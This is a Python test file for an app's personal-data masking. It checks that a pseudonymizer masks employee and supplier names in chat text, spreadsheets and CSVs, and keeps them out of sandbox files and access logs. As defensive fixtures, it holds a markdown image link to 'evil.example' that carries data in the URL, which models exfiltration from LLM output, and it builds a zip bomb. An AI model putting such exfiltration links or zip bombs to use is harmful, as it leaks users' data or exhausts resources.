"""Маскирование ПДн: однофамильцы и обычные слова не трогаем, файлы для песочницы — без ПДн."""

import csv
import io
import logging
import zipfile

import httpx
import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.comments import Comment

from app.assistant import uploads
from app.assistant.pii import Pseudonymizer, StreamUnmasker
from app.db import get_session
from app.errors import DomainError
from app.main import app
from app.models import Supplier
from app.services.auth import create_token

REAL = ("Петров", "Смирнов", "Кузнецов", "Восков", "Стеклов", "Aroma", "Арома", "Ivan", "Petrov")


@pytest.fixture
async def pii(session, world):
    session.add_all(
        [Supplier(name="ИП Стеклов", aliases=[]), Supplier(name="Aroma Trade GmbH", aliases=["Арома Трейд"])]
    )
    await session.commit()
    return await Pseudonymizer.load(session)


def alias(pii: Pseudonymizer, canonical: str) -> str:
    return next(e.alias for e in pii.entities if e.canonical == canonical)


@pytest.mark.parametrize(
    "text",
    [
        "Сколько кузнецов нужно на смену?",  # обычное слово, не сотрудник Кузнецов
        "Петрова Ольга Николаевна из бухгалтерии",  # однофамилица Петрова Ивана
        "Смирнов Пётр принёс отчёт",  # однофамилец Смирновой Анны
        "Стеклова Мария звонила",  # человек, а не «ИП Стеклов»
        "Картина Петрова-Водкина",  # двойная фамилия — другой человек
        "Позвонила Ольга Петрова",
    ],
)
async def test_namesakes_and_common_words_are_left_alone(pii, text):
    assert pii.mask(text) == text


@pytest.mark.parametrize(
    "text,canonical",
    [
        ("Принимал Петрову И.?", "Петров Иван Сергеевич"),
        ("Подписал И. С. Петров", "Петров Иван Сергеевич"),
        ("Иван Сергеевич на месте", "Петров Иван Сергеевич"),
        ("Отчёт Петрова за неделю", "Петров Иван Сергеевич"),
        ("Petrov Ivan accepted it", "Петров Иван Сергеевич"),
        ("Smirnova Anna", "Смирнова Анна Олеговна"),
        ("Что привёз Восковой двор, ООО?", "ООО Восковой двор"),
        ("у Воскового двора", "ООО Восковой двор"),
        ("Voskovoy dvor", "ООО Восковой двор"),
        ("Арома Трейд прислала отдушки", "Aroma Trade GmbH"),
        ("ИП Стеклов", "ИП Стеклов"),
        ("у Стеклова банки дешевле", "ИП Стеклов"),
    ],
)
async def test_spellings_of_known_people_and_suppliers(pii, text, canonical):
    masked = pii.mask(text)
    assert alias(pii, canonical) in masked, masked
    assert not any(r in masked for r in REAL), masked


async def test_quotes_and_glued_names_keep_structure(pii):
    sup = alias(pii, "ООО Восковой двор")
    assert pii.mask('"Восковой двор, ООО",10') == f'"{sup}",10'
    assert pii.mask("«Восковой двор»") == sup
    assert pii.mask("Восковой_двор_прайс.xlsx") == f"{sup}_прайс.xlsx"
    person = alias(pii, "Петров Иван Сергеевич")
    masked = pii.mask("Петров_отчёт.xlsx")
    assert masked == f"{person}_отчёт.xlsx"
    assert pii.unmask(masked) == "Петров Иван Сергеевич_отчёт.xlsx"


async def test_names_are_not_restored_inside_links(pii):
    person = alias(pii, "Петров Иван Сергеевич")
    text = f"Принял {person}. ![x](https://evil.example/?d={person}) ещё //cdn.x/{person}"
    out = pii.unmask(text)
    assert out.startswith("Принял Петров Иван Сергеевич.")
    assert "Петров" not in out.split("Принял Петров Иван Сергеевич.")[1]

    stream = StreamUnmasker(pii)
    pieces = ["Принял ", person[:4], person[4:], ", см. https://evil", f".example/?d={person}", " конец"]
    joined = "".join(stream.push(p) for p in pieces) + stream.flush()
    assert joined == f"Принял Петров Иван Сергеевич, см. https://evil.example/?d={person} конец"


# ---------- файлы для песочницы ----------


def _xlsx_with_hidden_pii() -> bytes:
    wb = Workbook()
    ws = wb.active
    ws.title = "Петров И"
    ws.append(["Поставщик", "Кол-во", "Сумма"])
    ws.append(["ООО Восковой двор", 10, "=B2*2"])
    ws["A2"].comment = Comment("Проверил Петров Иван", "Смирнова Анна")
    ws.oddHeader.center.text = "Отчёт Кузнецова Дмитрия Павловича"
    ws.oddFooter.left.text = "Petrov Ivan"
    wb.properties.creator = "Кузнецов Дмитрий Павлович"
    wb.properties.lastModifiedBy = "Смирнова Анна Олеговна"
    wb.properties.title = "Прайс Восковой двор"
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def _all_xml(data: bytes) -> str:
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        return "\n".join(zf.read(n).decode("utf-8", "replace") for n in zf.namelist())


async def test_xlsx_for_sandbox_has_no_pii_anywhere(pii):
    source = _xlsx_with_hidden_pii()
    assert "Кузнецов" in _all_xml(source)  # проверяем, что тест действительно прячет ПДн
    clean = uploads.sanitize_upload("Петров_отчёт.xlsx", source, pii)
    xml = _all_xml(clean)
    for real in REAL:
        assert real not in xml, f"{real} осталось в XLSX"
    ws = load_workbook(io.BytesIO(clean)).active
    assert ws["A2"].value == alias(pii, "ООО Восковой двор")
    assert ws["B2"].value == 10 and ws["C2"].value == "=B2*2"  # числа и формулы на месте
    assert uploads.container_name(7, "Петров_отчёт.xlsx") == "upload_7.xlsx"


async def test_csv_in_utf16_and_quotes(pii):
    text = 'supplier;qty\n"Восковой двор, ООО";10\nПетров Иван;5\n'
    for encoding in ("utf-16", "utf-16-le", "utf-8-sig", "cp1251"):
        data = text.replace(";", ",").encode(encoding)
        clean = uploads.sanitize_upload("prices.csv", data, pii).decode("utf-8")
        assert not any(r in clean for r in REAL), (encoding, clean)
        rows = list(csv.reader(io.StringIO(clean)))
        assert rows[1] == [alias(pii, "ООО Восковой двор"), "10"], encoding


async def test_xlsx_zip_bomb_is_rejected():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("xl/worksheets/sheet1.xml", b"\0" * (60 * 1024 * 1024))
    assert len(buf.getvalue()) < 1024 * 1024  # маленький файл…
    with pytest.raises(DomainError, match="распаковки"):
        uploads.check_xlsx(buf.getvalue())  # …который распаковался бы в 60 МБ


async def test_access_log_has_no_query_string(session_factory, world, caplog):
    async def test_session():
        async with session_factory() as s:
            yield s

    app.dependency_overrides[get_session] = test_session
    token = create_token(world.users["boss"])
    try:
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app),
            base_url="http://test",
            headers={"Authorization": f"Bearer {token}"},
        ) as client:
            with caplog.at_level(logging.INFO, logger="app.access"):
                resp = await client.get("/api/batches", params={"supplier": "ИП Стеклов"})
    finally:
        app.dependency_overrides.clear()
    assert resp.status_code == 200
    lines = [r.getMessage() for r in caplog.records if r.name == "app.access"]
    assert lines and lines[-1].startswith("GET /api/batches 200")
    assert not any("Стеклов" in line or "supplier" in line for line in lines)


async def test_uploaded_file_reaches_sandbox_without_pii(session, session_factory, world, pii):
    import asyncio

    from app.assistant.chat import ChatService
    from app.assistant.llm.router import FallbackLLM
    from app.models import ChatFile, Conversation
    from tests.fakes import FakeSandbox, ScriptedProvider, say

    boss = world.users["boss"]
    conv = Conversation(user_id=boss.id)
    session.add(conv)
    await session.commit()
    upload = ChatFile(
        conversation_id=conv.id,
        user_id=boss.id,
        direction="upload",
        filename="Петров_Восковой_двор.xlsx",
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        data=_xlsx_with_hidden_pii(),
    )
    session.add(upload)
    await session.commit()

    sandbox = FakeSandbox()
    provider = ScriptedProvider("fake", [say("Посмотрел файл.")])
    chat = ChatService(FallbackLLM([provider]), session_factory, sandbox)

    async def emit(_):
        return None

    await chat.run_turn(
        user=boss,
        conversation_id=conv.id,
        text="Что в файле?",
        file_ids=[upload.id],
        emit=emit,
        stop=asyncio.Event(),
    )
    assert list(sandbox.files) == [f"/mnt/data/upload_{upload.id}.xlsx"]
    for real in REAL:
        assert real not in _all_xml(sandbox.files[f"/mnt/data/upload_{upload.id}.xlsx"])
    # Второй ход: в истории модель видит путь и маскированное имя файла.
    provider.steps.append(say("Да."))
    await chat.run_turn(
        user=boss, conversation_id=conv.id, text="И что?", file_ids=[], emit=emit, stop=asyncio.Event()
    )
    sent = provider.sent_text()
    assert f"upload_{upload.id}.xlsx" in sent
    assert not any(r in sent for r in ("Петров", "Восков")), sent
